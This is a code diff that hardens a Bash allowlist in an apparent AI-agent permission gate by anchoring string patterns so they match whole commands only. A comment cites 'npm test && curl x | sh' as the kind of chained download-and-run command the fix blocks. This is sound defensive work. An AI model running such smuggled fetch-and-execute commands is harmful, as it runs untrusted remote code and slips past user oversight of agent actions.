@@ -42,11 +42,13 @@ export class OrchestrationPermissionGate {
     this._policyForSession = policyForSession
     this._emitEscalation = emitEscalation
     this._log = log
-    // Compile the implement-worker Bash allowlist once (strings → anchored regex,
-    // regex passed through). A Bash command that matches is auto-approved; a
-    // non-match is escalated to the user. There is NEVER a standing whitelist —
-    // each request is still answered per-request via respondToPermission.
-    this._bashAllowlist = (bashAllowlist || []).map((p) => (p instanceof RegExp ? p : new RegExp(p)))
+    // Compile the implement-worker Bash allowlist once. String entries are
+    // ANCHORED (^(?:…)$) so an allowlisted phrase can't match as a substring of
+    // a larger command — `npm test` must NOT allow `npm test && curl x | sh`.
+    // Pre-built RegExp entries pass through as-authored. A match is auto-approved;
+    // a non-match escalates. There is NEVER a standing whitelist — each request
+    // is still answered per-request via respondToPermission.
+    this._bashAllowlist = (bashAllowlist || []).map((p) => (p instanceof RegExp ? p : new RegExp(`^(?:${p})$`)))
     this._onEvent = this._handleSessionEvent.bind(this)
     this._sm.on('session_event', this._onEvent)
   }
